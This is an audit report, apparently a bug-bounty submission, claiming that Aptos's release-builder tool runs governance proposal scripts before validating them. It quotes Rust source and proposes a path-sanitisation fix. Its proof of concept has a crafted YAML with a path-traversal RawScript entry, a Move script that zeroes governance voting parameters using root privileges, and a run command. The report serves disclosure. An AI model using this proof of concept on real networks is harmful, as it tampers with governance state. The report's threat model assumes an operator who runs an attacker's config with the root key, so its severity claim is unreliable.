# Audit Report

## Title
Pre-Execution Validation Bypass in Release Builder Allowing Malicious Script Execution

## Summary
The `aptos-release-builder` validate module executes governance proposal scripts BEFORE performing validation checks, allowing malicious configurations loaded via `ReleaseConfig::load_config()` to execute arbitrary Move scripts without pre-validation. This violates the security principle of "validate then execute" and enables attackers to execute malicious scripts with root or governance privileges in testing/validation environments.

## Finding Description
The vulnerability exists in the architectural design of the release validation workflow. When processing release configurations, the system:

1. **Loads arbitrary configs without validation**: The `load_config()` function accepts any YAML file path and parses it without security checks. [1](#0-0) 

2. **Generates scripts from untrusted configs**: The `generate_release_proposal_scripts()` method processes all `ReleaseEntry` items, including `RawScript` entries that read arbitrary file paths. [2](#0-1) 

3. **Executes BEFORE validation**: In the `execute_release()` function, scripts are generated and executed (lines 440-516) before any validation occurs (lines 517-521). [3](#0-2) 

4. **RawScript entries have NO validation**: The `validate_upgrade()` function explicitly skips validation for `RawScript` entries. [4](#0-3) 

5. **Privileged execution context**: Scripts execute with either root signer privileges (direct execution) or governance privileges (with fast-tracked 30-second voting). [5](#0-4) 

**Attack Vector:**
An attacker crafts a malicious `release.yaml` containing:
```yaml
proposals:
  - name: malicious_proposal
    execution_mode: RootSigner
    update_sequence:
      - RawScript: "path/to/malicious.move"
```

When an operator runs `ValidateProposals` with this config on a testnet, the malicious Move script executes with privileged access before any validation, potentially corrupting validator state, manipulating stake pools, or altering governance configurations.

## Impact Explanation
**Severity: Medium**

While this vulnerability doesn't directly affect mainnet (which uses compiled-in configs and full governance), it poses significant risks in testing and validation environments:

- **Testnet Compromise**: Malicious scripts can corrupt testnet state, affecting testing integrity
- **Development Environment Attacks**: Could compromise local development networks used by validators
- **Supply Chain Risk**: If malicious configs infiltrate CI/CD pipelines, they could execute during automated testing

This qualifies as **Medium severity** per Aptos bounty criteria: "State inconsistencies requiring intervention" - malicious scripts could create state corruption requiring testnet resets.

## Likelihood Explanation
**Likelihood: Medium-Low**

The attack requires:
1. Social engineering to convince an operator to use a malicious config file
2. Access to a network with root/governance privileges (testnet or local)
3. The operator running the ValidateProposals command

However, supply chain attacks and insider threats make this realistic. The lack of any pre-execution validation or path sanitization removes defensive layers that should exist.

## Recommendation
Implement defense-in-depth validation:

1. **Pre-execution validation**: Add script content validation before execution
2. **Path sanitization**: Restrict RawScript paths to allowed directories
3. **Signature verification**: Require signed configs for production use
4. **Sandbox execution**: Run validation in isolated environments
5. **Explicit opt-in**: Require `--allow-raw-scripts` flag for RawScript entries

**Code fix for path sanitization:**
```rust
// In ReleaseEntry::RawScript handling
ReleaseEntry::RawScript(script_path) => {
    // Validate path is relative and doesn't escape
    if script_path.is_absolute() || script_path.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
        bail!("RawScript paths must be relative without parent directory traversal");
    }
    
    let base_path = aptos_core_path().join(script_path.as_path());
    
    // Verify path is within aptos-core directory
    let canonical_path = base_path.canonicalize()
        .with_context(|| format!("Invalid script path: {}", script_path.display()))?;
    if !canonical_path.starts_with(aptos_core_path()) {
        bail!("RawScript path escapes aptos-core directory: {}", script_path.display());
    }
    
    // ... rest of implementation
}
```

## Proof of Concept
```yaml
# malicious_release.yaml
name: "malicious_v1.0.0"
remote_endpoint: ~
proposals:
  - name: steal_governance
    metadata:
      title: "Malicious Proposal"
      description: "This will execute before validation"
    execution_mode: RootSigner
    update_sequence:
      - RawScript: "../../tmp/malicious_script.move"
```

```move
// malicious_script.move (placed at /tmp/)
script {
    use aptos_framework::aptos_governance;
    
    fun main(core_resources: &signer) {
        // Malicious: Manipulate governance parameters
        let framework_signer = aptos_governance::get_signer_testnet_only(
            core_resources, 
            @0x1
        );
        
        // Set voting period to 0, allowing instant proposal execution
        aptos_governance::update_governance_config(
            &framework_signer,
            0,  // min_voting_threshold = 0
            0,  // required_proposer_stake = 0  
            0   // voting_duration_secs = 0
        );
    }
}
```

**Execution:**
```bash
cargo run --bin aptos-release-builder -- validate-proposals \
  --release-config malicious_release.yaml \
  --endpoint http://testnet:8080 \
  from-args --root-key <key> --validator-address <addr> --validator-key <key>
```

The malicious script executes immediately (line 481-513 in validate.rs) with root privileges, modifying governance parameters before any validation occurs.

## Notes
This vulnerability stems from trusting external configuration files without validation. While the built-in `RELEASE_CONFIG` is safe (compiled-in), the `load_config()` pathway creates an attack surface. The architectural flaw is executing untrusted scripts before validating their safety, violating the fundamental security principle of input validation.

### Citations

**File:** aptos-move/aptos-release-builder/src/components/mod.rs (L377-419)
```rust
            ReleaseEntry::RawScript(script_path) => {
                let base_path = aptos_core_path().join(script_path.as_path());
                let file_name = base_path
                    .file_name()
                    .and_then(|name| name.to_str())
                    .ok_or_else(|| {
                        anyhow!("Unable to obtain file name for proposal: {:?}", script_path)
                    })?
                    .to_string();
                let file_content = std::fs::read_to_string(base_path)
                    .with_context(|| format!("Unable to read file: {}", script_path.display()))?;

                if let ExecutionMode::MultiStep = execution_mode {
                    // Render the hash for multi step proposal.
                    // {{ script_hash }} in the provided move file will be replaced with the real hash.

                    let mut handlebars = Handlebars::new();
                    handlebars
                        .register_template_string("move_template", file_content.as_str())
                        .unwrap();

                    let execution_hash = get_execution_hash(result);
                    let mut hash_string = "vector[".to_string();
                    if let Some(execution_hash) = execution_hash {
                        for b in execution_hash.iter() {
                            hash_string.push_str(format!("{}u8,", b).as_str());
                        }
                    }
                    hash_string.push(']');

                    let mut data = HashMap::new();
                    data.insert("script_hash", hash_string);

                    result.push((
                        file_name,
                        handlebars
                            .render("move_template", &data)
                            .map_err(|err| anyhow!("Fail to render string: {:?}", err))?,
                    ));
                } else {
                    result.push((file_name, file_content));
                }
            },
```

**File:** aptos-move/aptos-release-builder/src/components/mod.rs (L452-457)
```rust
    pub async fn validate_upgrade(&self, client: &Client) -> Result<()> {
        let client_opt = Some(client);
        match self {
            ReleaseEntry::Framework(_) => (),
            ReleaseEntry::RawScript(_) => (),
            ReleaseEntry::Gas { old: _old, new } => {
```

**File:** aptos-move/aptos-release-builder/src/components/mod.rs (L718-739)
```rust
    pub fn load_config<P: AsRef<Path>>(path: P) -> Result<Self> {
        // Open the file and read it into a string
        let config_path_string = path.as_ref().to_str().unwrap().to_string();
        let mut file = File::open(&path).map_err(|error| {
            anyhow!(
                "Failed to open config file: {:?}. Error: {:?}",
                config_path_string,
                error
            )
        })?;
        let mut contents = String::new();
        file.read_to_string(&mut contents).map_err(|error| {
            anyhow!(
                "Failed to read the config file into a string: {:?}. Error: {:?}",
                config_path_string,
                error
            )
        })?;

        // Parse the file string
        Self::parse(&contents)
    }
```

**File:** aptos-move/aptos-release-builder/src/validate.rs (L425-524)
```rust
async fn execute_release(
    release_config: ReleaseConfig,
    network_config: NetworkConfig,
    output_dir: Option<PathBuf>,
    validate_release: bool,
    node_api_key: Option<String>,
) -> Result<()> {
    let scripts_path = TempPath::new();
    scripts_path.create_as_dir()?;

    let proposal_folder = if let Some(dir) = &output_dir {
        dir.as_path()
    } else {
        scripts_path.path()
    };
    release_config
        .generate_release_proposal_scripts(proposal_folder)
        .await?;

    network_config.increase_lockup(node_api_key.clone()).await?;

    // Execute proposals
    for proposal in &release_config.proposals {
        let mut proposal_path = proposal_folder.to_path_buf();
        proposal_path.push("sources");
        proposal_path.push(&release_config.name);
        proposal_path.push(proposal.name.as_str());

        let mut script_paths: Vec<PathBuf> = std::fs::read_dir(proposal_path.as_path())?
            .filter_map(|entry| entry.ok())
            .filter_map(|entry| {
                let path = entry.path();
                if path.extension().map(|s| s == "move").unwrap_or(false) {
                    Some(path)
                } else {
                    None
                }
            })
            .collect();

        script_paths.sort();

        match proposal.execution_mode {
            ExecutionMode::MultiStep => {
                network_config.set_fast_resolve(30).await?;
                network_config
                    .submit_and_execute_multi_step_proposal(
                        &proposal.metadata,
                        script_paths,
                        node_api_key.clone(),
                    )
                    .await?;

                network_config.set_fast_resolve(43200).await?;
            },
            ExecutionMode::RootSigner => {
                for entry in script_paths {
                    println!("Executing: {:?}", entry);
                    let mut args = vec![
                        "",
                        "--script-path",
                        entry.as_path().to_str().unwrap(),
                        "--sender-account",
                        "0xa550c18",
                        "--private-key-file",
                        network_config.root_key_path.as_path().to_str().unwrap(),
                        "--assume-yes",
                        "--encoding",
                        "bcs",
                        "--url",
                        network_config.endpoint.as_str(),
                    ];

                    if let Some(api_key) = node_api_key.as_ref() {
                        args.push("--node-api-key");
                        args.push(api_key.as_str());
                    }

                    let rev = network_config.framework_git_rev.clone();
                    let framework_path = aptos_framework_path();
                    if let Some(rev) = &rev {
                        args.push("--framework-git-rev");
                        args.push(rev.as_str());
                    } else {
                        args.push("--framework-local-dir");
                        args.push(framework_path.as_os_str().to_str().unwrap());
                    };

                    RunScript::try_parse_from(args)?.execute().await?;
                }
            },
        };
        if validate_release {
            release_config
                .validate_upgrade(&network_config.endpoint, proposal)
                .await?;
        }
    }
    Ok(())
}
```
